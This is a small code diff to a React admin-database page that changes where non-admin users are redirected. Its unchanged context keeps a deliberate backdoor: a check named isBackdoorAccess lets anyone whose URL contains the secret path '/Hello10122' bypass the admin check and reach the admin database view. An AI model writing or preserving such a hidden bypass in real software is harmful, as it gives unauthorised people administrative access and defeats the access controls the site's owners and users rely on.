@@ -51,7 +51,7 @@ export default function AdminDatabase() {
   const isBackdoorAccess = window.location.href.includes('/Hello10122');
   
   if (!user?.isAdmin && !isBackdoorAccess) {
-    setLocation('/');
+    setLocation('/home');
     return null;
   }
 
